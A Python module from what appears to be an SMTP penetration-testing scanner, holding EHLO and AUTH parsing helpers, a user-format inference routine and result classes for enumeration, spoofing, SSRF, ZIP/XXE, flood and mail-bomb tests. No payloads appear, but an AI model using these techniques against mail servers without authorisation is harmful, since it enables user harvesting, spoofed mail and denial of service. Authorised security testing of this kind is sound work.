import argparse, ipaddress, json, queue, random, re, secrets, shutil, smtplib, socket, ssl, statistics, struct, subprocess, sys, textwrap, threading, time, unicodedata, zipfile, dns.resolver
from base64 import b64decode, b64encode
from io import BytesIO
from dataclasses import dataclass
from email.encoders import encode_base64
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from enum import Enum
from pathlib import Path
from typing import NamedTuple

from ptlibs.ptjsonlib import PtJsonLib
from ..ptntlmauth.ptntlmauth import NTLMInfo, get_NegotiateMessage_data, decode_ChallengeMessage_blob

try:
    from ntlm_auth.ntlm import NtlmContext
except ImportError:
    NtlmContext = None

from ._base import BaseModule, BaseArgs, Out
from ptlibs.ptprinthelper import get_colored_text
from .utils.helpers import (
    Target,
    Creds,
    ArgsWithBruteforce,
    check_if_brute,
    get_mode,
    valid_target,
    add_bruteforce_args,
    simple_bruteforce,
    text_or_file,
)
from .utils.blacklist_parser import BlacklistParser
from .utils.service_identification import identify_service
from .utils.smtp_fingerprints import ServerIdentifyResult, identify_smtp_server
from .utils.behavior_profiles import PROFILE_MISSING_HINTS

try:
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import rsa
    _HAS_CRYPTOGRAPHY = True
except ImportError:
    _HAS_CRYPTOGRAPHY = False


def _vendor_from_cpe(cpe: str | None) -> str | None:
    """Extract vendor from CPE 2.3 string (e.g. cpe:2.3:a:microsoft:exchange_server:*:*:*:*:*:*:*:* -> microsoft)."""
    if not cpe or ":" not in cpe:
        return None
    parts = cpe.split(":")
    if len(parts) >= 4 and parts[2] in ("a", "o", "h"):
        return parts[3] or None
    return None


def _registrable_domain_psl(host: str) -> str | None:
    """Get registrable domain from hostname using Public Suffix List (e.g. relay01.prod.amazon.co.jp -> amazon.co.jp).
    Returns None on failure or if ptlibs.tldparser is unavailable.
    """
    host = (host or "").strip()
    if not host or "." not in host:
        return None
    try:
        from ptlibs.tldparser import parse
        r = parse(host)
        if r is None:
            return None
        domain = getattr(r, "domain", None)
        suffix = getattr(r, "suffix", None)
        if domain and suffix:
            return f"{domain}.{suffix}"
        if domain:
            return domain
        return None
    except Exception:
        return None


# region helper methods


class TestFailedError(Exception):
    """Raised when a test fails in run-all mode; caught to continue with next test."""


def _is_private_ip(ip: str) -> bool:
    """True if ip is a private (RFC 1918 / ULA) address. Blacklist services only check public IPs."""
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def valid_target_smtp(target: str) -> Target:
    return valid_target(target, domain_allowed=True)


def _is_valid_hostname(host: str) -> bool:
    """True if host looks like a valid FQDN (contains dot, not just IP or generic label)."""
    if not host or not isinstance(host, str):
        return False
    host = host.strip()
    if "." not in host or len(host) < 4:
        return False
    try:
        ipaddress.ip_address(host)
        return False
    except ValueError:
        pass
    parts = host.split(".")
    return len(parts) >= 2


# SMTP EHLO: known extensions and security classification for output
SMTP_KNOWN_EXTENSIONS = frozenset(
    {
        "HELO", "EHLO", "MAIL", "RCPT", "DATA", "RSET", "NOOP", "QUIT",
        "VRFY", "EXPN", "HELP", "SEND", "SOML", "SAML", "TURN", "ETRN", "ATRN",
        "8BITMIME", "SIZE", "CHUNKING", "BINARYMIME", "CHECKPOINT", "DELIVERBY",
        "PIPELINING", "DSN", "AUTH", "BURL", "SMTPUTF8", "STARTTLS", "ENHANCEDSTATUSCODES",
        "VERB", "DEBUG",
    }
)
# AUTH method -> OK / WARNING / ERROR when on PLAIN (cleartext). Over TLS/STARTTLS all are OK.
SMTP_AUTH_METHOD_LEVEL_PLAIN = {
    "PLAIN": "ERROR", "LOGIN": "ERROR", "CRAM-MD5": "ERROR", "DIGEST-MD5": "ERROR",
    "NTLM": "ERROR", "ANONYMOUS": "ERROR", "KERBEROS_V4": "ERROR", "GSSAPI": "ERROR",
    "EXTERNAL": "WARNING",
    "XOAUTH2": "OK", "OAUTHBEARER": "OK", "SCRAM-SHA-1": "OK", "SCRAM-SHA-256": "OK",
}
SMTP_CMD_ERROR = frozenset({"VRFY", "EXPN", "TURN", "VERB", "SEND", "SOML", "SAML", "DEBUG"})
SMTP_CMD_WARNING = frozenset({"ETRN", "ATRN"})
SIZE_OK_MAX = 26214400       # 25 MB
SIZE_WARNING_MAX = 52428800  # 50 MB


def _parse_size_from_ehlo(ehlo_raw: str | bytes | None) -> int | None:
    """Parse EHLO for SIZE extension (RFC 1870). Returns max message size in bytes or None."""
    if ehlo_raw is None:
        return None
    if isinstance(ehlo_raw, bytes):
        ehlo_raw = ehlo_raw.decode(errors="replace")
    if not isinstance(ehlo_raw, str) or not ehlo_raw.strip():
        return None
    for line in ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        line = line.strip().upper()
        if not (line.startswith("250-") or line.startswith("250 ")):
            continue
        rest = line[4:].strip() if line.startswith("250-") else line[3:].strip()
        if not rest.upper().startswith("SIZE"):
            continue
        parts = rest.split(None, 1)
        if len(parts) < 2:
            return None
        try:
            return int(parts[1])
        except (ValueError, TypeError):
            return None
    return None


def _parse_rcptmax_from_ehlo(ehlo_raw: str) -> int | None:
    """Parse EHLO for LIMITS RCPTMAX=N (RFC 9422). Returns N or None."""
    if not ehlo_raw or not ehlo_raw.strip():
        return None
    for line in ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        line = line.strip().upper()
        if "LIMITS" not in line:
            continue
        # e.g. "250-LIMITS MAILMAX=100 RCPTMAX=512" or "250 LIMITS RCPTMAX=20"
        match = re.search(r"RCPTMAX\s*=\s*(\d+)", line, re.IGNORECASE)
        if match:
            return int(match.group(1))
    return None


def _parse_ehlo_extension_names(ehlo_raw: str | bytes | None) -> list[str]:
    """
    Parse EHLO response and return list of ESMTP extension display strings (e.g. "SIZE 52428800", "PIPELINING").
    Skips hostname line (first line). Used by HELO-only test to detect if server offers any extensions.
    Always returns a list (never None). Accepts str, bytes, or None.
    """
    if ehlo_raw is None:
        return []
    if isinstance(ehlo_raw, bytes):
        ehlo_raw = ehlo_raw.decode(errors="replace")
    if not isinstance(ehlo_raw, str) or not ehlo_raw.strip():
        return []
    lines = ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n")
    extensions: list[str] = []
    first_line = True
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith("250-"):
            rest = line[4:].strip()
        elif line.startswith("250 "):
            rest = line[3:].strip()
        else:
            continue
        rest = rest.replace("\r", " ").strip()
        if not rest:
            continue
        parts = rest.split(None, 1)
        key = (parts[0] or "").upper().strip()
        if key == "OK":
            continue
        # Hostname line: key has dot and is not a known extension
        if "." in key and key not in SMTP_KNOWN_EXTENSIONS:
            continue
        # First unknown (no dot) may be hostname; skip once
        if key not in SMTP_KNOWN_EXTENSIONS and "." not in key:
            if first_line:
                first_line = False
                continue
        extensions.append(rest)  # Full display string (e.g. "SIZE 52428800", "PIPELINING")
        first_line = False
    return extensions


def _parse_ehlo_commands(ehlo_raw: str, connection_encrypted: bool = False) -> list[tuple[str, str]]:
    """
    Parse EHLO response into list of (display_string, level) for output.
    Level is OK, WARNING, or ERROR. Hostname line (first line) is skipped.
    Expands AUTH CRAM-MD5 DIGEST-MD5 into separate AUTH CRAM-MD5, AUTH DIGEST-MD5.
    Handles both raw SMTP (250-...) and smtplib-style (no prefix) response.
    When connection_encrypted is True (TLS or STARTTLS), "STARTTLS (is not allowed)" is not
    added, since it is expected and OK on an already-encrypted connection.
    """
    if not ehlo_raw or not ehlo_raw.strip():
        return []
    lines = ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n")
    result: list[tuple[str, str]] = []
    seen_starttls = False
    first_line = True  # RFC: first EHLO line is always server hostname, not an extension

    for line in lines:
        line = line.strip()
        if not line:
            continue
        # Strip SMTP code if present: "250-..." or "250 ..."; else use whole line (smtplib often strips code)
        if line.startswith("250-"):
            rest = line[4:].strip()
        elif line.startswith("250 "):
            rest = line[3:].strip()
        else:
            rest = line.strip()
        if not rest:
            continue
        # Normalize \r so key/value match (SMTP uses \r\n; smtplib may leave \r on lines)
        rest = rest.replace("\r", " ").strip()
        if not rest:
            continue
        # First token is key, rest is value (e.g. "SIZE 29360128", "AUTH CRAM-MD5 DIGEST-MD5")
        parts = rest.split(None, 1)
        key = (parts[0] or "").upper().strip()
        value = (parts[1] or "").strip() if len(parts) > 1 else ""

        # Skip generic 250 completion (e.g. "250 Ok" / "250 OK") – not an extension
        if key == "OK":
            continue

        # Hostname line (key has dot, not a known extension): skip, not a command
        if "." in key and key not in SMTP_KNOWN_EXTENSIONS:
            continue
        # Unknown extension (no dot): show as OK, except first such line is usually hostname (RFC) – skip once
        if key not in SMTP_KNOWN_EXTENSIONS and "." not in key:
            if first_line:
                first_line = False
                continue
            result.append((rest, "OK"))
            if key == "STARTTLS":
                seen_starttls = True
            continue

        if key == "STARTTLS":
            seen_starttls = True

        if key == "AUTH":
            methods = value.split() if value else []
            for method in methods:
                method_upper = method.upper()
                # Over TLS/STARTTLS, AUTH PLAIN/LOGIN etc. are OK (RFC 8314). On plain they are ERROR.
                level = "OK" if connection_encrypted else SMTP_AUTH_METHOD_LEVEL_PLAIN.get(method_upper, "OK")
                result.append((f"AUTH {method_upper}", level))
            continue

        if key == "SIZE":
            try:
                size_val = int(value) if value else 0
                if size_val <= SIZE_OK_MAX:
                    level = "OK"
                elif size_val <= SIZE_WARNING_MAX:
                    level = "WARNING"
                else:
                    level = "ERROR"
            except (ValueError, TypeError):
                level = "OK"
            result.append((f"SIZE {value}".strip() or "SIZE", level))
            continue

        if key in SMTP_CMD_ERROR:
            level = "ERROR"
        elif key in SMTP_CMD_WARNING:
            level = "WARNING"
        else:
            level = "OK"
        display = f"{key} {value}".strip() if value else key
        result.append((display, level))

    if not seen_starttls and not connection_encrypted:
        result.append(("STARTTLS (is not allowed)", "ERROR"))

    return result


def _normalize_auth_response_for_comparison(response: str) -> str:
    """
    Normalize SMTP auth response for enumeration comparison.
    Strips session-specific parts (e.g. Gmail session IDs, hostname suffixes)
    to avoid false positives when the semantic message is identical.
    """
    if not response:
        return ""
    # Collapse whitespace
    normalized = " ".join(response.split())
    # Remove trailing " <session_id> - <hostname>" (e.g. Gmail " a92af...c88.0 - gsmtp")
    # Require session_id to be 15+ chars to avoid stripping real message text (e.g. "failed")
    normalized = re.sub(r"\s+[a-zA-Z0-9.-]{15,}\s+-\s+[a-zA-Z0-9.]+$", "", normalized)
    return normalized.strip()


def _get_auth_methods_from_ehlo(ehlo_raw: str | None) -> set[str]:
    """Extract AUTH method names (LOGIN, NTLM, etc.) from EHLO response."""
    if not ehlo_raw:
        return set()
    methods: set[str] = set()
    for line in ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        line = line.strip()
        if not line:
            continue
        rest = line[4:].strip() if line.startswith("250-") else (line[3:].strip() if line.startswith("250 ") else line)
        parts = rest.split(None, 1)
        key = (parts[0] or "").upper()
        if key == "AUTH" and len(parts) > 1:
            for m in parts[1].split():
                methods.add(m.upper())
    return methods


def _get_ehlo_extension_keys(ehlo_raw: str | None) -> list[str]:
    """Extract extension keys (VRFY, EXPN, AUTH, etc.) from EHLO response for comparison. Skips hostname line."""
    if not ehlo_raw:
        return []
    keys: list[str] = []
    first_line = True
    for line in ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        line = line.strip()
        if not line:
            continue
        rest = line[4:].strip() if line.startswith("250-") else (line[3:].strip() if line.startswith("250 ") else line)
        parts = rest.split(None, 1)
        key = (parts[0] or "").upper()
        if not key or key == "OK":
            continue
        # First line is usually server hostname (has dot)
        if first_line and "." in key and key not in SMTP_KNOWN_EXTENSIONS:
            first_line = False
            continue
        first_line = False
        keys.append(key)
    return keys


def _get_hostname_from_ehlo_raw(ehlo_raw: str | None) -> str | None:
    """Extract server hostname from first line of EHLO response (250 hostname or 250-hostname).
    Returns lowercase (RFC: domain names are case-insensitive in DNS)."""
    if not ehlo_raw:
        return None
    for line in ehlo_raw.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        line = line.strip()
        if not line:
            continue
        rest = line[4:].strip() if line.startswith("250-") else (line[3:].strip() if line.startswith("250 ") else line)
        parts = rest.split(None, 1)
        first = (parts[0] or "").strip()
        if first and "." in first and _is_valid_hostname(first):
            return first.lower()
    return None


def _auth_format_decode_login_challenge(resp: bytes | None) -> str | None:
    """Decode first base64 token in SMTP 334 body (typically 'Username:')."""
    if not resp:
        return None
    raw = resp.strip().split()
    if not raw:
        return None
    try:
        return b64decode(raw[0]).decode(errors="replace")
    except Exception:
        return None


def _auth_format_hint_from_challenge_text(text: str | None) -> str | None:
    if not text:
        return None
    low = text.lower()
    if "email" in low or "@" in low:
        return "full email address"
    if "domain\\" in low or "domain/" in low:
        return "NetBIOS format"
    if "username" in low or "login" in low or "user name" in low:
        return "username (ambiguous)"
    return None


# endregion

# region data classes


class NTLMResult(NamedTuple):
    success: bool
    ntlm: NTLMInfo | None


class MaxConnectionsResult(NamedTuple):
    max: int | None
    ban_minutes: float | None


class RcptLimitResult(NamedTuple):
    """Result of RCPT TO limit test: max accepted before server rejected or we stopped."""
    max_accepted: int
    limit_triggered: bool  # True if server sent 421/452/5xx or closed connection
    server_response: str | None  # First error response when limit triggered
    rejected_addresses: bool = False  # True if server rejected test addresses (450/550) before any accepted
    domain_used: str | None = None  # Domain used for MAIL FROM/RCPT TO (for hint when test failed)
    # Session error limit (smtpd_hard_error_limit): probe continues on 554/550/553 to detect disconnect
    failed_before_limit: int = 0  # Number of failed RCPTs before 421 or disconnect
    session_limit_triggered: bool = False  # True if server disconnected or returned 421
    no_session_limit: bool = False  # True if server allowed N failed RCPTs without disconnecting


class EnumResult(NamedTuple):
    method: str
    vulnerable: bool
    slowdown: bool | None
    results: list[str] | None
    server_reply: str | None = None  # First server response, e.g. "[550] User unknown"
    blocked_by_rbl: bool = False  # True when server rejected due to RBL (could not test)


class BlacklistEntry(NamedTuple):
    blacklist: str
    reason: str
    ttl: str


class BlacklistResult(NamedTuple):
    listed: bool
    results: list[BlacklistEntry] | None


class InfoResult(NamedTuple):
    banner: str
    ehlo: str
    ehlo_starttls: str | None = None  # EHLO after STARTTLS upgrade (when PLAIN had STARTTLS)


class EncryptionResult(NamedTuple):
    """
    Result of encryption test: which connection types are available on the port.
    Stored in SMTPResults.encryption so that subsequent tests can use it to choose
    the appropriate connection mode (plaintext, STARTTLS, or TLS).
    """
    plaintext_ok: bool
    starttls_ok: bool
    tls_ok: bool


class RoleResult(NamedTuple):
    """Result of role identification test: MTA, Submission, Hybrid, or indeterminate."""
    role: str              # "mta" | "submission" | "hybrid" | "indeterminate"
    port_hint: str         # "mta" | "submission" | "unknown"
    auth_advertised: bool  # AUTH found in EHLO (plain or STARTTLS)
    auth_required: bool | None  # True=all RCPT require auth, False=no, None=not tested
    detail: str            # Human-readable reason


# Catch-all test result: "configured" | "not_configured" | "indeterminate"
CatchAllResult = str


class AuthEnumResult(NamedTuple):
    """Result of AUTH user enumeration test."""
    vulnerable: bool
    indeterminate: bool
    method_tested: str  # "LOGIN" | "NTLM"
    protocol_flow_vuln: bool  # True if server responded 5xx after username (before password)
    invalid_user_responses: list[str]  # Responses for invalid user(s)
    valid_user_response: str | None  # Response for first -u / -w candidate + wrong password
    enumerated_users: tuple[str, ...]  # Subset of -u / -w whose response differs from invalid baseline
    detail: str | None


# PTL-SVC-SMTP-AUTH-FORMAT: infer expected AUTH LOGIN identity shape (username vs e-mail vs NetBIOS).
AUTH_FORMAT_PROBE_DELAY_SEC = 1.5
AUTH_FORMAT_EXTERNAL_SUFFIX = "example.com"


class AuthFormatTargetDomainDerivation(NamedTuple):
    """How probe-B domain was chosen (last-2-label heuristic; not PSL-aware)."""

    domain: str | None
    source: str  # scan_last2 | ehlo_last2 | none
    analyst_note: str | None  # always-on context for operators (PSL / IP fallback)
    ehlo_hostname: str | None  # set when source == ehlo_last2
    scan_hostname: str | None  # set when source == scan_last2


class AuthFormatProbeRow(NamedTuple):
    """One LOGIN probe (fresh connection)."""

    probe_id: str  # single_label | target_domain | external_domain | netbios
    label: str  # human label for UI
    identity: str
    skipped: bool
    skip_reason: str | None
    code_after_identity: int | None
    password_phase: bool  # 334 after identity → server accepted identity shape for this step
    code_after_password: int | None
    reply_after_identity: str | None
    rate_limited: bool


class AuthFormatProbeResult(NamedTuple):
    """Result of AUTH LOGIN format detection (PTL-SVC-SMTP-AUTH-FORMAT)."""

    method_tested: str  # "LOGIN" or ""
    rows: tuple[AuthFormatProbeRow, ...]
    challenge_decoded: str | None
    challenge_hint: str | None
    conclusion: str
    conclusion_id: str
    target_domain_used: str | None
    netbios_domain_used: str | None
    rate_limited: bool
    indeterminate: bool
    detail: str | None
    # Probe B context (PSL not used — analysts must sanity-check, esp. .co.uk etc.)
    target_domain_source: str  # scan_last2 | ehlo_last2 | none
    target_domain_analyst_note: str | None
    target_domain_ehlo_hostname: str | None
    target_domain_scan_hostname: str | None


def _auth_format_row_symbol(row: AuthFormatProbeRow) -> str:
    if row.skipped:
        return "skip"
    # Rate limit at username phase only — 334 then temp fail at password still means "accepted identity shape"
    if row.rate_limited and not row.password_phase:
        return "rate"
    c = row.code_after_identity
    if c == 334 and row.password_phase:
        return "334"
    if c is not None and 500 <= c < 600:
        return "535"
    if c is not None and 400 <= c < 500:
        return "4xx"
    if c is not None and 200 <= c < 300:
        return "2xx"
    return "?"


def _auth_format_conclude(
    sym_a: str,
    sym_b: str,
    sym_c: str,
    sym_d: str,
    b_ran: bool,
    d_ran: bool,
    challenge_hint: str | None,
) -> tuple[str, str]:
    """
    Map probe symbols to (conclusion_id, human conclusion).
    A=single_label, B=target_domain, C=external_domain, D=netbios.
    """
    if challenge_hint and sym_a == "?" and sym_b == "?" and sym_c == "?":
        return ("challenge_hint_only", f"Heuristic from LOGIN challenge text: {challenge_hint}")

    def acc(x: str) -> bool:
        return x == "334"

    def rej(x: str) -> bool:
        return x == "535"

    def acc_or_skip(x: str) -> bool:
        return x == "skip" or acc(x)

    all_acc_core = acc(sym_a) and acc(sym_c) and acc_or_skip(sym_b) and acc_or_skip(sym_d)

    # NetBIOS and "flexible vs NetBIOS" — keep before generic e-mail / catch-all buckets
    if b_ran and d_ran:
        if rej(sym_a) and rej(sym_b) and rej(sym_c) and acc(sym_d):
            return (
                "netbios_suggested",
                "NetBIOS-style identity accepted on LOGIN (DOMAIN\\user); other shapes rejected",
            )
        if acc(sym_a) and acc(sym_b) and acc(sym_c) and not acc(sym_d):
            return ("flexible_all_formats", "Flexible / accepts all tested identity formats")

    # --- 1. E-mail required (single-label rejected) ---
    if sym_a == "535":
        if b_ran and sym_b == "334":
            if sym_c == "334":
                return (
                    "email_format_any",
                    "Email address format required (any domain accepted)",
                )
            return (
                "email_format_target",
                "Full email address required (target domain specific)",
            )
        if not b_ran and sym_c == "334":
            return (
                "email_format_generic",
                "Email address format required (any domain likely accepted)",
            )

    # --- 2. Username only (single-label OK; e-mail shapes rejected) ---
    if sym_a == "334":
        if (not b_ran or sym_b == "535") and sym_c == "535":
            return (
                "username_only",
                "Username only — email address format rejected",
            )

    # A + target-domain accepted, external rejected (schema gap vs. username_only)
    if b_ran and d_ran and acc(sym_a) and acc(sym_b) and rej(sym_c) and not acc(sym_d):
        return (
            "username_or_target_domain",
            "Username or target-domain e-mail accepted (rejects arbitrary external domain)",
        )
    if b_ran and not d_ran and acc(sym_a) and acc(sym_b) and rej(sym_c):
        return (
            "username_or_target_domain",
            "Username or target-domain e-mail accepted (rejects arbitrary external domain)",
        )

    # --- 3. Catch-all / flexible (all probed shapes reach password phase) ---
    if all_acc_core:
        return (
            "generic_masking",
            "Generic behavior — all identities reach password phase (possible catch-all masking)",
        )

    # --- 4. Aggressive enumeration protection (reject at username for A; B/C consistent) ---
    if sym_a == "535":
        if (not b_ran or sym_b == "535") and sym_c == "535":
            return (
                "aggressive_protection",
                "Aggressive enumeration protection — all identities rejected at username phase",
            )

    if not b_ran and (acc(sym_a) or rej(sym_a)) and (acc(sym_c) or rej(sym_c)):
        return (
            "indeterminate_no_target_domain",
            "Indeterminate: target domain unknown (scan by IP). Use hostname target or inspect manually.",
        )

    return ("mixed_responses", "Mixed responses — manual review recommended")


class HeloValidationResult(NamedTuple):
    """Result of HELO/EHLO hostname validation test (RFC 5321, best practices)."""
    vulnerable: bool  # True = accepts syntactic nonsense or localhost
    weak_config: bool  # True = accepts non-existent FQDN (no DNS lookup)
    indeterminate: bool  # True = baseline failed (5xx on mail.google.com)
    ehlo_bypass: bool | None  # True = different EHLO extensions for different hostnames
    accepted_vectors: list[str]
    rejected_vectors: list[str]
    ehlo_comparison: dict[str, list[str]] | None  # hostname -> extension keys
    detail: str | None


class AuthDowngradeResult(NamedTuple):
    """Result of AUTH downgrade test: server changes AUTH offer after failed auth."""
    vulnerable: bool  # True = new weaker methods appeared after failure
    weakness: bool  # True = strong methods disappeared, PLAIN remained
    indeterminate: bool  # True = connection closed, no AUTH, etc.
    info_defensive: bool  # True = AUTH disappeared entirely (defensive reaction)
    methods_before: list[str]
    methods_after: list[str]
    auth_method_used: str  # XOAUTH2, OAUTHBEARER, etc.
    server_response: str | None
    detail: str | None
    rset_ok: bool | None = None  # None = not attempted, True = RSET OK, False = connection closed during RSET


class InvCommTestCase(NamedTuple):
    """Single invalid-commands test case result (PTL-SVC-SMTP-INVCOMM)."""
    category: str  # "invalid", "long_input", "special_chars", "bad_sequence"
    command_display: str  # Short display string
    status: int | None  # SMTP code or None if connection lost/timeout
    reply: str | None  # Server reply text
    session_ok: bool | None  # True=RSET/NOOP worked after, False=conn closed, None=not attempted
    info_leak: bool  # True if reply contains paths, versions, stack trace
    vulnerable: bool  # True if crash/timeout or accepted invalid (2xx)
    response_time_sec: float | None = None  # Time to receive response (for long_input ReDoS detection)
    slow_response: bool = False  # True if response took > threshold (possible ReDoS in parser)
    vuln_type: str | None = None  # "acceptance" | "crash" | "timeout" when vulnerable


class InvCommResult(NamedTuple):
    """Result of invalid/non-standard SMTP commands test (PTL-SVC-SMTP-INVCOMM)."""
    vulnerable: bool  # True = crash, timeout, or accepted invalid command
    weakness: bool  # True = verbose error messages (info leak)
    indeterminate: bool  # True = rate limit or could not complete
    tests: tuple[InvCommTestCase, ...]
    detail: str | None
    baseline_latency_sec: float | None = None  # Measured NOOP latency before fuzzing (for adaptive threshold)
    tarpitting_detected: bool = False  # True when constant delay on invalid commands (smtpd_error_sleep_time)


class HeloOnlyResult(NamedTuple):
    """Result of HELO-only test (PTL-SVC-SMTP-HELOONLY). Server supports only HELO, no EHLO extensions."""
    vulnerable: bool  # True = server supports only HELO, no EHLO extensions
    indeterminate: bool  # True = could not complete (connection error, rate limit)
    helo_status: int | None  # SMTP status from HELO (e.g. 250)
    helo_reply: str | None  # Raw reply from HELO
    ehlo_status: int | None  # SMTP status from EHLO (e.g. 250, 500, 502)
    ehlo_reply: str | None  # Raw reply from EHLO
    extensions: tuple[str, ...]  # Parsed ESMTP extensions from EHLO (empty if none/vulnerable)
    connection_type: str  # "plain" | "starttls" | "tls"
    detail: str | None


class HeloBypassResult(NamedTuple):
    """Result of HELO/EHLO bypass test (PTL-SVC-SMTP-HELO)."""
    vulnerable: bool
    indeterminate: bool
    submission_bypass_ehlo: tuple[str, ...]
    relay_bypass_ehlo: tuple[str, ...]
    accepts_invalid_format: tuple[str, ...]
    ehlo_consistent: bool
    ehlo_comparison: dict
    tarpitting_detected: tuple[str, ...]
    rcpt_latencies: dict
    detail: str | None


class BounceReplayResult(NamedTuple):
    """Result of bounce replay / backscatter test (PTL-SVC-SMTP-REPLAY)."""
    vulnerable: bool
    indeterminate: bool
    message_accepted: bool
    rcpt_rejected_in_session: bool
    bounce_addr: str
    recipient_used: str
    test_id: str
    smtp_trace: tuple[str, ...]
    tarpitting_or_timeout: bool  # True when response took >30s or timeout (greylisting/tarpitting)
    detail: str | None
    message_accepted_return_path: bool  # Second probe: DATA with Return-Path header
    test_id_return_path: str


def _bounce_replay_active(args) -> bool:
    """True when `-br` / `--bounce-replay` was passed."""
    return bool(getattr(args, "bounce_replay", False))


def _bounce_replay_from_addr(args) -> str | None:
    """Controlled bounce address: `-m` / `--mail-from` when `-br` is active."""
    if not _bounce_replay_active(args):
        return None
    m = getattr(args, "mail_from", None) or ""
    s = str(m).strip()
    return s if s else None


def _classify_connection_error(exc: BaseException) -> tuple[str, str]:
    """
    Classify connection error for BOMB test.
    Returns (last_error_type, last_error_message).
    - connection_reset: Typically Firewall/IPS (Layer 4)
    - timeout: Often Tarpitting or queue overload on MTA
    """
    msg = str(exc).lower()
    if isinstance(exc, ConnectionResetError):
        return ("connection_reset", str(exc))
    if isinstance(exc, BrokenPipeError):
        return ("broken_pipe", str(exc))
    if isinstance(exc, (socket.timeout, TimeoutError)):
        return ("timeout", str(exc))
    if isinstance(exc, OSError) and hasattr(exc, "errno"):
        if exc.errno in (104, 54):  # ECONNRESET, ECONNABORTED
            return ("connection_reset", str(exc))
        if exc.errno in (110, 60):  # ETIMEDOUT, ETIMEDOUT on Windows
            return ("timeout", str(exc))
    if "timeout" in msg or "timed out" in msg:
        return ("timeout", str(exc))
    if "reset" in msg or "connection reset" in msg or "eof" in msg:
        return ("connection_reset", str(exc))
    if "broken pipe" in msg or "pipe" in msg:
        return ("broken_pipe", str(exc))
    return ("other", str(exc))


class AntivirusCategoryResult(NamedTuple):
    """Result of one category in ANTIVIRUS test (PTL-SVC-SMTP-ANTIVIRUS)."""
    category: str
    sent: int
    accepted: int
    rejected: int
    error: int
    smtp_trace: tuple[str, ...]
    detail: str | None


class AntivirusResult(NamedTuple):
    """Result of ANTIVIRUS test (PTL-SVC-SMTP-ANTIVIRUS)."""
    vulnerable: bool
    indeterminate: bool
    partial_protection: bool
    categories: tuple[AntivirusCategoryResult, ...]
    elapsed_sec: float
    detail: str | None


class SsrfVariantResult(NamedTuple):
    """Result of one variant in SSRF test (PTL-SVC-SMTP-SSRF)."""
    variant: str
    sent: int
    accepted: int
    rejected: int
    error: int
    smtp_trace: tuple[str, ...]
    detail: str | None


class SsrfResult(NamedTuple):
    """Result of SSRF test (PTL-SVC-SMTP-SSRF)."""
    manual_verification_required: bool
    canary_url: str
    variants: tuple[SsrfVariantResult, ...]
    elapsed_sec: float
    detail: str | None
    verification_instructions: str


class ZipxxeVariantResult(NamedTuple):
    """Result of one variant in ZIPXXE test (PTL-SVC-SMTP-ZIPXXE)."""
    variant: str
    sent: int
    accepted: int
    rejected: int
    error: int
    smtp_trace: tuple[str, ...]
    detail: str | None


class ZipxxeResult(NamedTuple):
    """Result of ZIPXXE test (PTL-SVC-SMTP-ZIPXXE)."""
    manual_verification_required: bool
    canary_url: str
    variants: tuple[ZipxxeVariantResult, ...]
    elapsed_sec: float
    detail: str | None
    verification_instructions: str
    all_rejected_at_rcpt: bool


class SpoofHeaderVariantResult(NamedTuple):
    """Result of one variant in Spoof headers test."""
    variant: str  # "from", "reply_to", "return_path"
    accepted: bool
    rejected: bool
    error: bool
    smtp_status: int | None
    smtp_reply: str | None
    detail: str | None
    envelope_header_mismatch: bool  # True for "from" when MAIL FROM != From header


class SpoofHeaderResult(NamedTuple):
    """Result of Spoof headers test."""
    vulnerable: bool
    indeterminate: bool
    variants: tuple[SpoofHeaderVariantResult, ...]
    elapsed_sec: float
    detail: str | None
    vulnerable_note: str | None  # Blue Team: SPF/DMARC impact disclaimer


class BccTestResult(NamedTuple):
    """Result of Bcc header test – manual verification required."""
    message_accepted: bool
    smtp_status: int | None
    smtp_reply: str | None
    recipients_to: tuple[str, ...]
    recipients_cc: tuple[str, ...]
    recipients_bcc: tuple[str, ...]
    elapsed_sec: float
    detail: str | None
    verification_instructions: str


class AliasVariantResult(NamedTuple):
    """Result of one variant in Alias bypass test (PTL-SVC-SMTP-ALIAS)."""
    variant: str
    address: str
    accepted: bool
    rejected: bool
    error: bool
    smtp_status: int | None
    smtp_reply: str | None
    detail: str | None
    uucp_warning: bool  # True when bang_simple accepted – warn about UUCP/relay risk


class AliasTestResult(NamedTuple):
    """Result of Alias & Addressing bypass test (PTL-SVC-SMTP-ALIAS)."""
    base_address: str
    variants: tuple[AliasVariantResult, ...]
    elapsed_sec: float
    detail: str | None
    verification_instructions: str


class FloodResult(NamedTuple):
    """Result of FLOOD test (PTL-SVC-SMTP-FLOOD) – queue overload, SIZE extension."""
    vulnerable: bool
    indeterminate: bool
    partial_protection: bool
    size_advertised: bool
    size_limit_bytes: int | None
    size_enforced: bool | None  # None = N/A (SIZE not advertised)
    messages_sent: int
    messages_accepted: int
    messages_rejected: int
    first_rejection_at: int | None
    tarpitting_detected: bool
    elapsed_sec: float
    smtp_trace: tuple[str, ...]
    queue_attempts: int
    flood_notes: tuple[str, ...]
    detail: str | None


class BombResult(NamedTuple):
    """Result of BOMB (mail flood) test (PTL-SVC-SMTP-BOMB)."""
    vulnerable: bool
    indeterminate: bool
    partial_protection: bool  # True when server limited but only after many messages (first_rejection_at > 50)
    sent: int
    delivered: int
    rate_limited: int
    blocked: int
    connection_lost: int
    first_rejection_at: int | None
    elapsed_sec: float
    tarpitting_detected: bool
    last_error: str  # Last connection_lost error message
    last_error_type: str  # "connection_reset" | "timeout" | "broken_pipe" | "other" | ""
    avg_rtt_ms: float | None  # Average response time per message [ms]; None if no measurable samples
    smtp_trace: tuple[str, ...]
    per_message_delivered: tuple[bool, ...]  # one entry per completed attempt, in message order (1..sent)
    aborted_on_smtp_500: bool
    abort_at_message: int | None
    detail: str | None


@dataclass
class SMTPResults:
    blacklist: BlacklistResult | None = None
    blacklist_private_ip_skipped: bool = False  # True when target is private IP (not on public blacklists)
    spf_records: dict[str, list[str]] | None = None
    spf_error: str | None = None  # When run-all SPF test fails
